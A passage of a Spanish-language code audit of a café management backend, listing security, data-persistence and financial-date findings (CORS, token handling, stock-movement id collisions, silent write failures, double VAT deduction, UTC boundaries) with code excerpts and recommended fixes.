**Impacto:** Permite que cualquier origen sondee y use los endpoints públicos (p. ej. /tpv/ping, /carta) y, con un token robado, opere la API desde un sitio malicioso. Para un negocio real es una puerta innecesariamente abierta.

**Recomendación:** Restringir CORS al origen conocido de la app (whitelist del dominio de Render/PWA) y limitar métodos/cabeceras. Mantener públicos solo los endpoints que lo necesiten.

### seguridad.7 · Guard económico: cierra las fugas conocidas pero es blocklist por prefijo y solo sobre res.json

**🟡 MEDIO** · estado: parcial (arreglado a medias) · esfuerzo: M · confianza: media

*Área:* Autorización / Regla nº2

*Ubicación:* `backend/economia-guard.js:13-24, 48-54`

```js
if (req.user && req.user.rol !== "admin") {
    const original = res.json.bind(res);
    res.json = (body) => original(stripEconomia(body));
  }
```

**Problema:** filtrarRespuestas solo envuelve res.json; cualquier ruta que devuelva coste por res.send/res.end (HTML, CSV, PDF) no se filtra. Además es un blocklist por prefijo de nombre: cubre coste*, margen*, food_cost*, beneficio*, ebitda*, valor_stock*, etc., pero no nombres como precio_coste, markup, cmv, ganancia ni pvp_recomendado (hoy mbds.js los protege con su propio sinEconomia, y las rutas financieras están fuera de EQUIPO_ALLOWED, por eso no hay fuga abierta). Depende de que nadie cree en el futuro un campo de coste con otro nombre o lo sirva como texto.

**Impacto:** Hoy las fugas conocidas quedan cerradas (lo confirmo), pero la protección es frágil: un campo nuevo mal nombrado o una exportación servida con res.send filtraría coste/margen al equipo sin que nadie lo note, reabriendo la regla nº2.

**Recomendación:** Complementar el blocklist con un allowlist por ruta/vista para datos sensibles, cubrir también res.send de rutas accesibles por 'equipo', y añadir un test que falle si una respuesta de equipo contiene cualquier clave de coste. Mantener el guard como última barrera, no como única.

### seguridad.8 · Comparación de token no constante en /avisos/cron y /facturas/ingesta

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Webhooks

*Ubicación:* `backend/server.js:210, 274`

```js
if (got !== token) return res.status(401).json({ error: "Token inválido" });
```

**Problema:** Ambos webhooks comparan el token con !== (cortocircuito, tiempo variable), a diferencia del conector TPV que usa crypto.timingSafeEqual (tpv-connector.js:61-66). Es una inconsistencia con el propio estándar del código.

**Impacto:** Teóricamente un atacante podría inferir el token por timing; en la práctica es difícil sobre la red con tokens de alta entropía en variables de entorno, por eso la severidad es baja. Aun así es un endurecimiento barato y uniforme.

**Recomendación:** Reutilizar una comparación en tiempo constante (como igualesSeguro de tpv-connector) en /avisos/cron y /facturas/ingesta.

### seguridad.9 · Token JWT en localStorage sin httpOnly ni rotación

**⚪ BAJO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Gestión de sesión

*Ubicación:* `frontend/index.html:2289-2292, 2566`

```js
function setSession(u) { localStorage.setItem("cm_session", JSON.stringify(u)); }
```

**Problema:** La sesión (incluido el token) se guarda en localStorage (cm_session), legible por cualquier JS de la página. No hay httpOnly ni refresh/rotación; el token dura 12h fijas.

**Impacto:** Convierte cualquier XSS (ver hallazgo de XSS) en robo inmediato del token de admin y acceso a todo el dinero durante hasta 12h. Es el objetivo de exfiltración que hace crítico el XSS sin CSP.

**Recomendación:** Valorar cookie httpOnly+Secure+SameSite para el token (con mitigación CSRF por el patrón de API), o al menos acortar la vida del token con renovación, y priorizar la corrección del XSS y la CSP que son las que lo hacen explotable.

---

## 3 · Integridad de datos y persistencia

**Cómo funciona hoy:** data-store.js mantiene una caché en memoria (objeto `cache[entidad]`) que se hidrata al arrancar. Con DATABASE_URL usa PostgreSQL (una tabla por entidad; cada fila = documento JSONB con `id` como PRIMARY KEY, upsert `ON CONFLICT (id) DO UPDATE`); sin ella escribe ficheros JSON en /data con `fs.writeFileSync`. Las escrituras en Postgres se SERIALIZAN por entidad en una cola de promesas (`encolar`) cuyo `.catch` manda el error a consola; `flush()` espera con `Promise.allSettled`. El API síncrono (`readAll`, `insert`, `update`, `remove`, `writeAll`, `transaction`, `nextId`) devuelve siempre el objeto al instante y persiste en segundo plano. `readAll` devuelve la REFERENCIA del array cacheado. `insert`/`update` persisten fila a fila (upsert); `writeAll` reescribe la colección entera (en Postgres vía `replaceAll` = DELETE + re-INSERT de todas las filas en una transacción). Los `stock_movements` (libro que, por regla, es la única razón por la que el stock cambia) se generan en un array LOCAL dentro de un bucle y se insertan todos al final del bucle.

**Salud:** Regular con riesgos serios: el camino Postgres es razonable (CRUD por fila, transacciones reales), pero hay un bug de colisión de ids que CORROMPE el libro de movimientos de stock en cada sincronización de Ágora, y la cola de escritura oculta los fallos de BD (las rutas responden 200 aunque la fila no se guarde). En modo JSON, la escritura no es atómica y un corte deja la entidad corrupta que luego se lee como vacía y se sobrescribe, perdiéndolo todo. No hay apagado ordenado (SIGTERM) que vacíe la cola antes de que Render reinicie.

### datos.1 · Colisión de ids en stock_movements al insertar por lote: el libro de stock pierde filas en cada sync de Ágora

**🔴 CRÍTICO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Libro de movimientos / nextId

*Ubicación:* `backend/data-store.js:254-258 (nextId) + backend/agora.js:293 y :314`

```js
// data-store.js
function nextId(prefix, name) {
  const items = readAll(name);
  const n = items.length + 1;
  return `${prefix}-${String(n).padStart(3, "0")}-${Date.now().toString().slice(-5)}`;
}
// agora.js (dentro del forEach, antes de insertar)
movimientos.push({ id: store.nextId("mov", "stock_movements"), ... });
// ...tras el bucle:
movimientos.forEach((mv) => store.insert("stock_movements", mv));
```

**Problema:** nextId calcula `n = items.length + 1` leyendo la caché de 'stock_movements'. Pero los movimientos de un lote se acumulan en un array LOCAL (`const movimientos = []`, agora.js:206) y NO se insertan en la caché hasta DESPUÉS del bucle (agora.js:314). Durante todo el bucle, `readAll('stock_movements').length` no cambia, así que `n` es idéntico para todos los movimientos del lote. El único diferenciador es `Date.now().toString().slice(-5)`, que en un forEach síncrono devuelve el MISMO milisegundo para muchas iteraciones. Resultado: varios movimientos con id idéntico (p. ej. `mov-042-57310`). En Postgres, `store.insert`→`upsert` hace `ON CONFLICT (id) DO UPDATE`, así que el segundo movimiento SOBREESCRIBE al primero y la fila original se pierde sin error. En JSON quedan dos filas con el mismo id (id deja de ser único).

**Impacto:** Cada venta de Ágora descuenta stock de varios ingredientes y genera un movimiento por ingrediente; en una sync normal se crean decenas de movimientos en el mismo milisegundo, con colisión casi segura. El stock (materias.disponibilidad_actual) SÍ se decrementa y se persiste, pero el movimiento correspondiente desaparece en la recarga desde Postgres: se rompe la regla 'el stock no cambia sin movimiento'. El inventario físico vs teórico y la conciliación de almacén dejan de cuadrar y es imposible auditar mermas/robos a partir del libro.

**Recomendación:** No basar el id en length. Generar ids únicos monotónicos: un contador en memoria + sufijo aleatorio, o `randomUUID()`, o un contador por lote. Mínimo: pasar un índice incremental al generar cada movimiento del lote. Verificar también que ningún otro id derivado de length se genere dentro de un bucle antes de insertar. Mismo arreglo en los tres sitios.

### datos.2 · Mismo bug de colisión en la conciliación de duplicados y en el inventario físico

**🔴 CRÍTICO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Libro de movimientos / nextId

*Ubicación:* `backend/conciliacion-ventas.js:248 y :258 + backend/routes/inventario.js:64 y :88`

```js
// conciliacion-ventas.js
movimientos.push({ id: store.nextId("mov", "stock_movements"), source: "conciliacion", ... reason: "reverso_duplicado", ... });
...
movimientos.forEach((mv) => store.insert("stock_movements", mv));
// routes/inventario.js
movimientos.push({ id: store.nextId("mov", "stock_movements"), source: "inventario", ... reason: "inventario", ... });
```

**Problema:** Idéntico patrón: `const movimientos = []` local, `id: store.nextId('mov','stock_movements')` dentro del bucle, e inserción en bloque al final. Mientras se construye el array, la caché no crece, así que todos los movimientos del lote comparten `n` y, si caen en el mismo ms, el mismo id completo.

**Impacto:** Al limpiar ventas duplicadas de Ágora se REPONE stock y se escriben movimientos 'reverso_duplicado'; al cerrar un inventario físico se escriben movimientos 'inventario' que ajustan el teórico al real. Si colisionan, se pierden filas del reverso (el stock repuesto no queda trazado) o del ajuste de inventario (no queda constancia del descuadre corregido), justo las operaciones que más necesitan auditoría.

**Recomendación:** El mismo arreglo de nextId resuelve los tres sitios a la vez. Añadir un test que inserte un lote de >50 movimientos y verifique que `new Set(ids).size === ids.length` tras recargar desde BD.

### datos.3 · En modo Postgres las rutas responden 200 aunque la escritura encolada falle

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Cola de escritura / durabilidad

*Ubicación:* `backend/data-store.js:150-159 y :162-166 y :203-208`

```js
function encolar(name, op) {
  const prev = colas[name] || Promise.resolve();
  const next = prev.then(op).catch((e) => console.error(`Error guardando '${name}':`, e.message));
  colas[name] = next;
  return next;
}
function flush() {
  return Promise.allSettled(Object.values(colas));
}
```

**Problema:** `encolar` captura el error de la escritura con `.catch((e) => console.error(...))`, de modo que la promesa SIEMPRE resuelve. `insert`/`update` actualizan la caché en memoria (push/patch) y devuelven el objeto de inmediato SIN esperar ni propagar el resultado de la BD. `flush()` usa `Promise.allSettled`, que nunca rechaza. Por tanto una ruta que haga `store.insert(...); await store.flush(); res.json(...)` responde 201 con el objeto aunque el `pool.query` haya lanzado (constraint, caída de conexión, BD llena).

**Impacto:** Divergencia silenciosa caché↔BD: el usuario ve 'guardado', pero la fila no está en Postgres. Al reiniciar (Render redeploy) la caché se rehidrata desde la BD y el dato desaparece. Afecta a cualquier escritura: un cierre de caja, una recepción, un pago, una venta de Ágora. El único rastro del fallo es un console.error que nadie mira.

**Recomendación:** Hacer que `encolar` propague el error (no tragarlo) y que `flush()` rechace si alguna escritura falló (recoger los rejected de allSettled y lanzar). Las rutas críticas deben devolver 500 si flush falla. Alternativa más robusta: que `insert`/`update` devuelvan la promesa de persistencia y las rutas la esperen.

### datos.4 · Escritura JSON no atómica + catch que devuelve [] ante JSON inválido = pérdida total de una entidad

**🟠 ALTO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Persistencia JSON

*Ubicación:* `backend/data-store.js:102-108 (readFile) y :110-112 (writeFile)`

```js
function readFile(name) {
  try {
    return JSON.parse(fs.readFileSync(filePath(name), "utf-8"));
  } catch (e) {
    return [];
  }
}
function writeFile(name, data) {
  fs.writeFileSync(filePath(name), JSON.stringify(data, null, 2), "utf-8");
}
```

**Problema:** `writeFile` hace `fs.writeFileSync` directo sobre el fichero final: si el proceso muere a mitad (SIGTERM de redeploy, OOM, corte), el .json queda truncado/corrupto. En el siguiente arranque `readFile` hace `JSON.parse` dentro de un try/catch que ante CUALQUIER error devuelve `[]` — sin distinguir 'no existe' de 'corrupto'. La caché queda vacía y el primer `writeAll`/`insert` persiste ese estado vacío, borrando para siempre los datos previos de esa entidad.

**Impacto:** En modo JSON (dev, y cualquier despliegue sin DATABASE_URL) un único corte durante la escritura puede vaciar materias, ventas o stock_movements de forma permanente y silenciosa. No hay copia ni alerta; el sistema sigue arrancando 'como si no hubiera nada'.

**Recomendación:** Escritura atómica: escribir a `fichero.tmp` y `fs.renameSync` sobre el definitivo (rename es atómico en el mismo FS). En `readFile`, distinguir ENOENT (→ []) de error de parseo (→ lanzar/abortar o renombrar el fichero a .corrupt y alertar), nunca sobrescribir datos existentes con []. Opcional: `fs.fsyncSync` del directorio para durabilidad real.

### datos.5 · writeAll reescribe la tabla ENTERA (DELETE + re-INSERT) en cada sync de Ágora; 'ventas' crece sin límite

**🟠 ALTO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* Rendimiento y durabilidad de writeAll

*Ubicación:* `backend/data-store.js:173-177 y :184-188 + backend/db.js:112-129 + backend/agora.js:315-316`

```js
// agora.js, tras procesar los documentos del lote:
store.writeAll("materias", materias);
store.writeAll("ventas", ventas);
// db.js replaceAll:
await client.query(`DELETE FROM ${t}`);
for (const item of items) { ... await client.query(SQL_UPSERT(t), [String(item.id), item]); }
```

**Problema:** `writeAll` → `persistAll` → `db.replaceAll`, que hace `DELETE FROM tabla` y luego re-INSERTA TODAS las filas. El propio db.js advierte que replaceAll es 'SOLO para siembra/migración inicial, no en el flujo normal', pero el flujo normal de Ágora llama `store.writeAll('ventas', ventas)` y `store.writeAll('materias', materias)` en CADA ingesta (cron horario + cada push del conector). 'ventas' crece indefinidamente con el histórico del café.

**Impacto:** Tras meses de operación, cada sync borra y reinserta miles de filas de ventas enteras cada hora: carga innecesaria sobre Postgres, bloqueos, y una ventana en la que la tabla queda vacía a mitad de transacción. Y como va por la cola con catch silencioso (hallazgo anterior), si ese replaceAll gigante falla, se pierde toda la sync sin aviso. Además desaprovecha el diseño CRUD por fila que ya existe (upsert).

**Recomendación:** En la ingesta usar upsert por fila (store.insert/update) para las ventas nuevas y para las materias tocadas, en vez de writeAll de toda la colección. Reservar replaceAll solo para siembra. Si se mantiene writeAll, al menos hacerlo por diff (solo filas cambiadas).

### datos.6 · Sin handler SIGTERM/beforeExit: en el redeploy de Render se pierden las escrituras encoladas

**🟠 ALTO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Apagado ordenado

*Ubicación:* `backend/server.js (no existe handler) + backend/data-store.js:149-159`

```js
// server.js: app.listen(PORT, ...) — no hay ningún process.on('SIGTERM'/'beforeExit') que haga flush.
// data-store.js: la cola solo se vacía si alguien llama flush() explícitamente.
function flush() { return Promise.allSettled(Object.values(colas)); }
```

**Problema:** No hay `process.on('SIGTERM')`, `SIGINT` ni `beforeExit` en ningún punto del backend (solo hay `process.exit(1)` en rutas de error). En Postgres las escrituras viven en la cola `colas` y se confirman de forma asíncrona; las rutas que NO hacen `await store.flush()` dejan escrituras en vuelo. Cuando Render manda SIGTERM para reiniciar/desplegar, el proceso muere sin vaciar la cola.

**Impacto:** Toda escritura encolada y no confirmada en el momento del redeploy se pierde: ventas de la última sync, un pago recién marcado, un cierre de caja. Como el redeploy es un evento rutinario (cada deploy, cada reinicio de Render), esto ocurre en la práctica, no solo en fallos.

**Recomendación:** Registrar `process.on('SIGTERM')` y `SIGINT` que cierren el servidor HTTP, hagan `await store.flush()` (una vez que flush propague errores) y cierren el pool de pg antes de `process.exit(0)`. Idealmente con un timeout de gracia.

### datos.7 · Integridad referencial: un materia_id inexistente en un escandallo se ignora en silencio

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Integridad referencial

*Ubicación:* `backend/agora.js:287-298 + backend/conciliacion-ventas.js:240-253`

```js
(producto.ingredientes || []).forEach((ing) => {
  const m = idxMat[ing.materia_id];
  if (!m) return;           // materia inexistente → ingrediente ignorado sin rastro
  const delta = -Math.round(ing.cantidad * cantidad * 100) / 100;
  ...
});
```

**Problema:** Al descontar stock por una venta, se recorren los ingredientes del producto y se hace `const m = idxMat[ing.materia_id]; if (!m) return;`. Si el escandallo apunta a una materia borrada o con id cambiado, el ingrediente se salta: no descuenta stock, no crea movimiento y no deja ningún aviso. Lo mismo al reponer en la conciliación.

**Impacto:** El food cost y el stock quedan infravalorados sin que nadie lo sepa: un café con una materia mal referenciada 'no consume' esa materia nunca. El descuadre se achaca a mermas cuando en realidad es una referencia rota en el escandallo. Difícil de detectar porque es silencioso.

**Recomendación:** Contabilizar y devolver los ingredientes con materia_id no resuelto en el resumen de la sync (como ya se hace con productos 'no vinculados'), para que aparezcan en la pantalla de integraciones/conciliación y se puedan arreglar. No hace falta bloquear la venta, basta con exponerlo.

### datos.8 · Riesgo de disco efímero sin DATABASE_URL: el blindaje (REQUIRE_DB) es opt-in, el default es peligroso

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Configuración de producción

*Ubicación:* `backend/server.js:425-436`

```js
if (!db.isActive()) {
  const enProd = process.env.NODE_ENV === "production";
  console.warn("⚠️  PERSISTENCIA EFÍMERA: ...");
  if (enProd && process.env.REQUIRE_DB === "1") {
    console.error("REQUIRE_DB=1 y sin DATABASE_URL en producción: arranque abortado.");
    process.exit(1);
  }
}
```

**Problema:** Si no hay DATABASE_URL, el arranque solo se aborta cuando además NODE_ENV=production Y REQUIRE_DB==='1'. Por defecto (sin esa variable) el servidor arranca igualmente en producción escribiendo JSON sobre el disco efímero de Render.

**Impacto:** Un despliegue en el que falte o se escriba mal DATABASE_URL (o se caiga la BD y el connect falle, cayendo a JSON) corre 'normal' y PIERDE todos los datos en el siguiente reinicio. El endpoint /api/salud lo marca como 'efimera' y el front avisa, pero nada lo impide salvo acordarse de poner REQUIRE_DB=1.

**Recomendación:** Invertir el default en producción: si NODE_ENV=production y no hay BD activa, abortar salvo que se ponga explícitamente un flag ALLOW_EPHEMERAL=1. Así el caso peligroso exige una decisión consciente, no el olvido de una variable. Además, si connect() falla teniendo DATABASE_URL definido, abortar en vez de degradar a JSON silenciosamente.

### datos.9 · transaction() en modo JSON no es atómica a nivel de disco (sin rollback de ficheros)

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: media

*Área:* Transacciones

*Ubicación:* `backend/data-store.js:225-252`

```js
// tras db.tx (o directamente en JSON):
if (!usingDb) tocadas.forEach((name) => writeFile(name, cache[name]));
// writeFile por entidad, secuencial, sin atomicidad entre ficheros ni rollback
```

**Problema:** En Postgres la transacción es real (db.tx con BEGIN/COMMIT/ROLLBACK). En JSON, tras aplicar las operaciones a la caché, se recorren las entidades tocadas y se hace `writeFile` de cada una por separado (línea 251). Si el proceso muere o un writeFile lanza entre la entidad A y la B, queda un COMMIT parcial en disco (A escrita, B no) sin forma de deshacerlo. Se combina con la escritura no atómica del hallazgo de JSON.

**Impacto:** Operaciones multi-entidad que deben ser todo-o-nada (p. ej. cerrar una producción: descontar materias + crear lote) pueden quedar a medias en disco en modo JSON: stock descontado sin lote, o al revés. Afecta sobre todo a dev/tests y a cualquier despliegue sin BD.

**Recomendación:** En JSON, escribir todos los ficheros tocados de forma atómica (tmp+rename por fichero) y, si un rename falla, revertir los ya aplicados o al menos no dejar la caché divergente. La solución completa (atomicidad multi-fichero) es difícil en FS; priorizar que producción use siempre Postgres (ver hallazgo REQUIRE_DB).

### datos.10 · nextId basado en length: reutiliza ids tras borrados y colisiona entre peticiones concurrentes

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: media

*Área:* Generación de ids

*Ubicación:* `backend/data-store.js:254-258`

```js
function nextId(prefix, name) {
  const items = readAll(name);
  const n = items.length + 1;   // baja al borrar → id reutilizable
  return `${prefix}-${String(n).padStart(3, "0")}-${Date.now().toString().slice(-5)}`;
}
```

**Problema:** El id incorpora `items.length + 1`. Si una entidad admite borrado (`remove`), al borrar una fila la longitud baja y un nextId posterior puede reproducir un id ya usado antes (reutilización de id). Además, dos peticiones concurrentes que generen id para la misma entidad en el mismo milisegundo con la misma longitud obtienen el mismo id (p. ej. una merma manual mientras corre una sync de Ágora).

**Impacto:** Referencias cruzadas que apuntaban a un id borrado pueden 'resucitar' apuntando a una fila nueva distinta; y una colisión concurrente en Postgres sobrescribe (upsert) una de las dos filas. Probabilidad baja en el uso normal de un café, pero el modo de fallo es silencioso y difícil de diagnosticar.

**Recomendación:** Sustituir el esquema length+timestamp por un id realmente único e irrepetible: `crypto.randomUUID()` o un prefijo legible + UUID/contador persistente monotónico. Resuelve a la vez este hallazgo y el crítico de stock_movements.

---

## 4 · Motor financiero y fechas (correctitud)

**Cómo funciona hoy:** Todo rango temporal nace en backend/periods.js: rango(preset,now) devuelve [desde,hasta) para hoy/ayer/semana/mes/año y los comparativos (comparativoAnterior para periodo previo y tramoHastaMismoDia para la comparación "a la misma fecha" días 1..N vs 1..N). La semana arranca en lunes ((getDay()+6)%7). El dinero del periodo lo compone financials.beneficio: "ventas" titular en BRUTO (Σ importe, cuadra con Ágora) y el P&L (beneficio, food cost, margen) sobre ventas NETAS (financials.netoDeVenta = importe/1,10 salvo que exista importe_neto). costing.js es la fuente única de coste/margen de producto; cuenta-resultados.js arma el P&L mensual y acepta overrides de ventas (config ventas_mes_YYYY-MM, que asume BRUTO y de-IVA dividiendo /1,10). dashboard-ceo.js y executive-dashboard.js orquestan la portada: la previsión del día ya usa hora de Madrid (tz.horaDecimal), pero el AGRUPADO por día sigue haciéndose con new Date(now).toISOString().slice(0,10) (UTC) y las fronteras de periods.js usan setHours/getDay/new Date(y,m,1) en hora del servidor (UTC en Render). El negocio es Europe/Madrid; Render corre en UTC.

**Salud:** Correcto en lo esencial (semana=lunes, tramoHastaMismoDia capa bien los meses cortos, previsión del día ya en hora de Madrid, divisiones de ratios casi todas protegidas con base>0/return null). Pero quedan tres fallos reales de correctitud: un doble descuento de IVA al importar el cierre de Ágora por CSV (ingresos del mes ~9% bajos), el desbordamiento confirmado de comparativoAnterior('mes') que aún usa la pantalla de Salud, y las fronteras de día/semana/mes todavía en UTC (mitigado por el horario del café pero latente e incoherente con tz.fechaLocal, que existe pero no se usa).

### motor-fechas.1 · Doble descuento de IVA al importar el cierre de Ágora (CSV): ingresos del mes ~9% bajos

**🟠 ALTO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* cuenta-resultados / análisis del mes

*Ubicación:* `backend/routes/analisis-mes.js:34 + backend/cuenta-resultados.js:138-139`

```js
// analisis-mes.js importa el snapshot y guarda snap.neto (la columna Base = NETO):
  if (store.findById("config", id)) store.update("config", id, { valor: snap.neto });
// cuenta-resultados.js lee ese mismo valor como si fuera BRUTO y lo vuelve a de-IVAr:
  else if (Number.isFinite(ovGuardado) && ovGuardado > 0) { ventasBruto = ovGuardado; ventas_origen = "cierre_guardado"; }
  const ventas = ventas_origen === "produccion" ? eur(ventasNetasProd) : eur(ventasBruto / (1 + IVA_VENTA));
```

**Problema:** Al importar el export 'Análisis de Ventas' de Ágora, analisis-mes.parseFilas suma la columna E (Base = importe NETO) en snap.neto y el route guarda snap.neto en config `ventas_mes_YYYY-MM`. Pero cuenta-resultados asume que ese config viene en BRUTO y lo divide entre 1,10 (IVA_VENTA=0.10). Como el valor ya era neto, se le quita el IVA dos veces. Es muy probablemente un RESTO de la migración 'P&L sobre neto' de esta sesión: el override de ventas quedó asumiendo bruto mientras la ingesta pasó a guardar neto.

**Impacto:** La vía de importar el CSV es la que usa la fundadora cuando el conector va atrasado, y es la fuente única del cierre del mes. Un mes de 12.000 € netos reales se registra como ~10.909 € de ingresos (−1.091 €, −9,1%). EBITDA, margen bruto en euros, break-even y el cumplimiento de objetivos del mes salen sistemáticamente bajos, y encima la portada (que usa Σ importe bruto de la entidad ventas) muestra OTRA cifra de ventas del mes distinta: dos números de 'ventas del mes' que no cuadran.

**Recomendación:** Decidir una única semántica para config `ventas_mes_*`. Lo más limpio: guardar el BRUTO (snap.total) en vez de snap.neto en routes/analisis-mes.js, o bien marcar el origen y no volver a dividir en cuenta-resultados cuando el valor ya es neto. Añadir un test que importe un CSV de 12.000 € netos y verifique que cuenta.ingresos == 12.000 (no 10.909).

### motor-fechas.2 · analisis-mes (vía conector) etiqueta el bruto como 'neto' y duplica el IVA en 'total'

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* análisis del mes

*Ubicación:* `backend/analisis-mes.js:136-138`

```js
const cant = Number(v.cantidad) || 0, imp = Number(v.importe) || 0;
const d = (diasMap[fecha] = diasMap[fecha] || { fecha, uds: 0, neto: 0, total: 0 });
d.uds += cant; d.neto += imp; d.total += imp * (1 + IVA_HOSTELERIA);
```

**Problema:** En agregarDesdeVentas (snapshot del mes desde lo que mete el conector) v.importe es BRUTO con IVA (así lo tratan financials.netoDeVenta y analisis-diario: 'imp = Number(v.importe) // bruto'), pero aquí se suma a d.neto (lo llama neto) y d.total = bruto × 1,10 (IVA otra vez). Además ignora v.importe_neto, que la ingesta sí guarda. La vía CSV (parseFilas) sí separa bien Base (col E) y Total (col F); solo la vía conector está mal, así que las dos vías de ingesta son incoherentes entre sí.

**Impacto:** En meses servidos por el conector, la pantalla 'Análisis del mes' enseña un 'neto' que en realidad es el bruto y un 'total' inflado un 10% sobre el bruto (≈21% por encima del neto real). El ticket medio (neto/tickets) también queda mal. Diverge de la cifra de ventas del mes de la portada y del P&L → rompe 'una sola fuente de verdad para el dinero'.

**Recomendación:** Usar el neto real: d.neto += (v.importe_neto != null ? Number(v.importe_neto) : financials.netoDeVenta(v)) y d.total += Number(v.importe) (bruto), reutilizando el helper de financials en vez de reinventar el IVA. Test: una venta con importe=110, importe_neto=100 debe dar neto=100 y total=110.

### motor-fechas.3 · Fronteras de día/semana/mes/año en hora del servidor (UTC en Render), no en Europe/Madrid

**🟡 MEDIO** · estado: abierto · esfuerzo: M · confianza: alta

*Área:* periods / dashboards

*Ubicación:* `backend/periods.js:29-47 + backend/dashboard-ceo.js:136`

```js
function startOfDay(t) { const d = new Date(t); d.setHours(0, 0, 0, 0); return d.getTime(); }
function startOfWeek(t) { const d = new Date(startOfDay(t)); const dow = (d.getDay() + 6) % 7; return d.getTime() - dow * DAY; }
function startOfMonth(t) { const d = new Date(t); return new Date(d.getFullYear(), d.getMonth(), 1).getTime(); }
// y el agrupado por día del dashboard:
const hoy = new Date(now).toISOString().slice(0, 10);
```

**Problema:** setHours/getDay/new Date(y,m,1) usan la hora local del proceso = UTC en Render, así que el 'día/semana/mes' empieza a las 00:00 UTC = 01:00 (invierno) / 02:00 (verano) de Madrid. Lo mismo con toISOString().slice(0,10) (día UTC) en dashboard-ceo (líneas 136,156,181,207,321,450) y toDateString() en business-health.js:95. Existe tz.fechaLocal() que daría el día correcto de Málaga, pero NO se usa en ningún agrupado (es prácticamente código muerto). Demostración ejecutada: una venta a las 00:30 de Madrid del 1-jul (22:30Z del 30-jun) cae en JUNIO, no en julio; startOfMonth(now)=2026-07-01T00:00:00Z = 02:00 de Madrid.

**Impacto:** Mitigado hoy porque el café abre ~8 y cierra ~16 (no hay ventas entre 00:00 y 02:00) y porque Ágora manda BusinessDay (día de negocio ya correcto), así que el impacto REAL sobre ventas diarias/mensuales es bajo. Pero es un fallo latente: ventas de eventos nocturnos o del arranque del día 1, prorrateo de costes fijos/mermas/recepciones y la frontera 'ayer/hoy' si se mira el panel de madrugada caen en el periodo equivocado; y crea incoherencia silenciosa entre pantallas (UTC) y la intención de tz.

**Recomendación:** Centralizar el cálculo de fronteras en Madrid: derivar año/mes/día con tz.partes()/tz.fechaLocal() (o Intl con timeZone Europe/Madrid) y construir los límites a partir de esas partes locales; sustituir todos los toISOString().slice(0,10)/toDateString() de agrupado por tz.fechaLocal(now). Al mover a Madrid, usar aritmética de calendario (no restar DAY fijo) para ayer/semana por el cambio horario.

### motor-fechas.4 · comparativoAnterior('mes') se desborda al mes siguiente a fin de mes largo (lo usa la Salud del Negocio)

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* periods / business-health

*Ubicación:* `backend/periods.js:96-100 + backend/routes/business-health.js:15`

```js
case "mes": case "mes_anterior": desde = addMonths(r.desde, -1); break;
...
return { desde, hasta: desde + len, label: "Periodo anterior" };
// business-health.js:  const ant = periods.comparativoAnterior(preset, now);
```

**Problema:** Para 'mes' en curso, len = now − inicioMes (p. ej. 30,5 días el 31-mar) y hasta = inicioMesAnterior + len. Como el mes anterior puede ser más corto, hasta se sale de él. Demostración ejecutada: el 31-mar-2026 comparativoAnterior devuelve 2026-02-01 → 2026-03-03 12:00, es decir TODO febrero + 2,5 días de marzo (del propio mes en curso). tramoHastaMismoDia, que ya existe y resuelve esto capando al último día del mes (dias=28 para feb), NO se usa en esta ruta.

**Impacto:** En los días 29–31 de meses de 31 días que siguen a uno más corto (mar tras feb; may/jul/ago/oct/dic tras un mes de 30), la pantalla 'Salud del Negocio' con preset=mes compara contra una base inflada con días del propio mes en curso → la flecha y el delta de salud (margen, food cost, laboral del 'periodo anterior') salen falseados justo al cierre de mes, que es cuando más se mira.

**Recomendación:** En rutas de periodo EN CURSO usar tramoHastaMismoDia({meses:1}) como ya hacen executive-dashboard, cierre-mes y cashflow; o, mínimo, capar hasta = Math.min(desde+len, startOfMonth(now)) en comparativoAnterior para 'mes'. Añadir test con now=31-mar que verifique que el comparativo no pasa del 28-feb.

### motor-fechas.5 · comparativoAnioAnterior: deriva de 1 h en DST y salto 29-feb → 1-mar

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: media

*Área:* periods

*Ubicación:* `backend/periods.js:107-108`

```js
desde: new Date(new Date(r.desde).getFullYear() - 1, new Date(r.desde).getMonth(), new Date(r.desde).getDate(), new Date(r.desde).getHours()).getTime(),
hasta: new Date(new Date(r.hasta).getFullYear() - 1, new Date(r.hasta).getMonth(), new Date(r.hasta).getDate(), new Date(r.hasta).getHours()).getTime(),
```

**Problema:** Reconstruye el rango del año anterior con getDate()/getHours() ingenuos. Un 29-feb pasa a 1-mar del año no bisiesto (new Date(2025,1,29)=1-mar), y como conserva solo la hora y no los minutos/segundos puede desplazar el límite; combinado con un año que cruce el cambio horario, la frontera baila 1 h. Es el comparativo 'año anterior' que executive-dashboard expone en comparativo.anio_anterior.

**Impacto:** Bajo hoy: m de materia no tiene aún histórico interanual real, el café cierra pronto (la hora no toca ventas) y este comparativo es sobre todo metadato de rango. Latente de cara a tener datos del año pasado: el 29-feb y los bordes del periodo anual quedarían ligeramente mal alineados.

**Recomendación:** Construir el año anterior con partes de fecha en Madrid y capar el día al último del mes destino (como hace tramoHastaMismoDia); fijar 00:00 en lugar de arrastrar getHours().

### motor-fechas.6 · Proyección de mes/cierre lineal muy volátil los primeros días (día 1-3)

**⚪ BAJO** · estado: abierto · esfuerzo: M · confianza: media

*Área:* executive-dashboard / cuenta-resultados

*Ubicación:* `backend/executive-dashboard.js:113-115`

```js
const diasTranscurridos = Math.max(1, (now - rMes.desde) / periods.DAY);
const diasDelMes = 365 / 12;
beneficioActual.proyeccion_mes = eur(benMes.beneficio_operativo * (diasDelMes / diasTranscurridos));
```

